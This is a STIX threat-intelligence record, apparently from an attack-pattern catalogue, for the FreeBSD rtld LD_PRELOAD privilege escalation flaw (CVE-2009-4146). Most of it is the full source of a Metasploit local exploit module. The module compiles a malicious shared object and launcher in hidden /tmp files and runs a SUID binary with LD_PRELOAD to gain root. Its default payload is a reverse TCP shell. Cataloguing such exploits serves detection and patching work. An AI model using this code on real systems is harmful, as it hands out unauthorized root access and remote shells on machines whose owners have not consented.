{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--659269bb-f33b-4853-9a6e-8519a8a57ec6",
    "created": "2024-08-14T16:33:36.195774Z",
    "modified": "2024-08-14T16:33:36.195778Z",
    "name": "FreeBSD rtld execl() Privilege Escalation",
    "description": " This module exploits a vulnerability in the FreeBSD run-time link-editor (rtld).  The rtld `unsetenv()` function fails to remove `LD_*` environment variables if `__findenv()` fails.  This can be abused to load arbitrary shared objects using `LD_PRELOAD`, resulting in privileged code execution.  This module has been tested successfully on:  FreeBSD 7.2-RELEASE (amd64); and FreeBSD 8.0-RELEASE (amd64).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/freebsd/local/rtld_execl_priv_esc.rb",
            "external_id": "rtld_execl_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-4146"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-4147"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2009/Nov/371"
        },
        {
            "source_name": "reference",
            "url": "https://c-skills.blogspot.com/2009/11/always-check-return-value.html"
        },
        {
            "source_name": "reference",
            "url": "https://lists.freebsd.org/pipermail/freebsd-announce/2009-December/001286.html"
        },
        {
            "source_name": "reference",
            "url": "https://xorl.wordpress.com/2009/12/01/freebsd-ld_preload-security-bypass/"
        },
        {
            "source_name": "reference",
            "url": "https://securitytracker.com/id/1023250"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Post::File\n  include Msf::Post::Unix\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'FreeBSD rtld execl() Privilege Escalation',\n        'Description' => %q{\n          This module exploits a vulnerability in the FreeBSD\n          run-time link-editor (rtld).\n\n          The rtld `unsetenv()` function fails to remove `LD_*`\n          environment variables if `__findenv()` fails.\n\n          This can be abused to load arbitrary shared objects using\n          `LD_PRELOAD`, resulting in privileged code execution.\n\n          This module has been tested successfully on:\n\n          FreeBSD 7.2-RELEASE (amd64); and\n          FreeBSD 8.0-RELEASE (amd64).\n        },\n        'License' => MSF_LICENSE,\n        'Author' =>\n          [\n            'Kingcope', # Independent discovery, public disclosure, and exploit\n            'stealth', # Discovery and exploit (4b1717926ed0d4823622011625fb1824)\n            'bcoles' # Metasploit (using Kingcope's exploit code [modified])\n          ],\n        'DisclosureDate' => '2009-11-30',\n        'Platform' => ['bsd'], # FreeBSD\n        'Arch' =>\n          [\n            ARCH_X86,\n            ARCH_X64,\n            ARCH_ARMLE,\n            ARCH_AARCH64,\n            ARCH_PPC,\n            ARCH_MIPSLE,\n            ARCH_MIPSBE\n          ],\n        'SessionTypes' => ['shell'],\n        'References' =>\n          [\n            ['BID', '37154'],\n            ['CVE', '2009-4146'],\n            ['CVE', '2009-4147'],\n            ['SOUNDTRACK', 'https://www.youtube.com/watch?v=dDnhthI27Fg'],\n            ['URL', 'https://seclists.org/fulldisclosure/2009/Nov/371'],\n            ['URL', 'https://c-skills.blogspot.com/2009/11/always-check-return-value.html'],\n            ['URL', 'https://lists.freebsd.org/pipermail/freebsd-announce/2009-December/001286.html'],\n            ['URL', 'https://xorl.wordpress.com/2009/12/01/freebsd-ld_preload-security-bypass/'],\n            ['URL', 'https://securitytracker.com/id/1023250']\n          ],\n        'Targets' => [['Automatic', {}]],\n        'DefaultOptions' =>\n          {\n            'PAYLOAD' => 'bsd/x86/shell_reverse_tcp',\n            'PrependSetresuid' => true,\n            'PrependSetresgid' => true,\n            'PrependFork' => true,\n            'WfsDelay' => 10\n          },\n        'DefaultTarget' => 0\n      )\n    )\n    register_options([\n      OptString.new('SUID_EXECUTABLE', [true, 'Path to a SUID executable', '/sbin/ping'])\n    ])\n    register_advanced_options([\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ])\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def suid_exe_path\n    datastore['SUID_EXECUTABLE']\n  end\n\n  def upload(path, data)\n    print_status(\"Writing '#{path}' (#{data.size} bytes) ...\")\n    rm_f(path)\n    write_file(path, data)\n    register_file_for_cleanup(path)\n  end\n\n  def check\n    kernel_release = cmd_exec('uname -r').to_s\n    unless kernel_release =~ /^(7\\.[012]|8\\.0)/\n      return CheckCode::Safe(\"FreeBSD version #{kernel_release} is not vulnerable\")\n    end\n\n    vprint_good(\"FreeBSD version #{kernel_release} appears vulnerable\")\n\n    unless command_exists?('cc')\n      return CheckCode::Safe('cc is not installed')\n    end\n\n    vprint_good('cc is installed')\n\n    unless setuid?(suid_exe_path)\n      return CheckCode::Detected(\"#{suid_exe_path} is not setuid\")\n    end\n\n    vprint_good(\"#{suid_exe_path} is setuid\")\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable?(base_dir)\n      fail_with(Failure::BadConfig, \"#{base_dir} is not writable\")\n    end\n\n    max_len = 1_000\n    if base_dir.length > max_len\n      fail_with(Failure::BadConfig, \"#{base_dir} path length #{base_dir.length} is larger than #{max_len}\")\n    end\n\n    payload_path = \"#{base_dir}/.#{rand_text_alphanumeric(5..10)}\"\n\n    executable_data = <<~LIB\n      #include <stdio.h>\n      #include <stdlib.h>\n      #include <unistd.h>\n\n      void _init() {\n        extern char **environ;\n        environ=NULL;\n        system(\"#{payload_path} &\");\n      }\n    LIB\n\n    executable_path = \"#{base_dir}/.#{rand_text_alphanumeric(5..10)}\"\n    upload(\"#{executable_path}.c\", executable_data)\n    output = cmd_exec(\"cc -o #{executable_path}.o -c #{executable_path}.c -fPIC -Wall\")\n    register_file_for_cleanup(\"#{executable_path}.o\")\n\n    unless output.blank?\n      print_error(output)\n      fail_with(Failure::Unknown, \"#{executable_path}.c failed to compile\")\n    end\n\n    lib_name = \".#{rand_text_alphanumeric(5..10)}\"\n    lib_path = \"#{base_dir}/#{lib_name}\"\n    output = cmd_exec(\"cc -shared -Wall,-soname,#{lib_name}.0 #{executable_path}.o -o #{lib_path}.0 -nostartfiles\")\n    register_file_for_cleanup(\"#{lib_path}.0\")\n\n    unless output.blank?\n      print_error(output)\n      fail_with(Failure::Unknown, \"#{executable_path}.o failed to compile\")\n    end\n\n    exploit_data = <<~EXPLOIT\n      #include <stdio.h>\n      #include <stdlib.h>\n      #include <string.h>\n      #include <unistd.h>\n\n      int main() {\n        extern char **environ;\n        environ = (char**)calloc(8096, sizeof(char));\n        environ[0] = (char*)calloc(1024, sizeof(char));\n        environ[1] = (char*)calloc(1024, sizeof(char));\n        strcpy(environ[1], \"LD_PRELOAD=#{lib_path}.0\");\n        return execl(\"#{suid_exe_path}\", \"\", (char *)0);\n      }\n    EXPLOIT\n\n    exploit_path = \"#{base_dir}/.#{rand_text_alphanumeric(5..10)}\"\n    upload(\"#{exploit_path}.c\", exploit_data)\n    output = cmd_exec(\"cc #{exploit_path}.c -o #{exploit_path} -Wall\")\n    register_file_for_cleanup(exploit_path)\n\n    unless output.blank?\n      print_error(output)\n      fail_with(Failure::Unknown, \"#{exploit_path}.c failed to compile\")\n    end\n\n    upload(payload_path, generate_payload_exe)\n    chmod(payload_path)\n\n    print_status('Launching exploit...')\n    output = cmd_exec(exploit_path)\n    output.each_line { |line| vprint_status line.chomp }\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-11-30",
    "x_mitre_platforms": [
        "['bsd'], # FreeBSD"
    ]
}